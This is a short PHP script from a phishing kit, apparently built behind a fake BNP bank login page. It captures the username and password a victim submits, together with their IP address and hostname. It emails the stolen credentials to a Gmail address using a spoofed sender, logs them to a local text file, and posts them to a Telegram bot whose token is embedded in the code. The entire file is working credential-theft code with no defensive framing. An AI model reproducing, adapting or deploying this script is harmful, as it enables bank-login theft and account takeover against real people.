<?php	

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------------------------------\n";

$bilsmg .= " USR:           : ".$_POST['ch1']."\n";
$bilsmg .= " PWD:           : ".$_POST['idpassword']."\n";
$bilsmg .= " isp|: $ip | $hostname\n";
$bilsmg .= "------------------------------------\n";






$bilsnd = "@gmail.com";
$bilsub = "Bnp ID | $ip";
$bilhead = "From: Bnp ID <info2@mail.ziggo.nl>";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);


$Txt_Rezlt = fopen('rzlt.txt', 'a+');
fwrite($Txt_Rezlt, $bilsmg);
fclose($Txt_Rezlt);

$token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-791509674&text=" . urlencode($bilsmg)."" );





?>
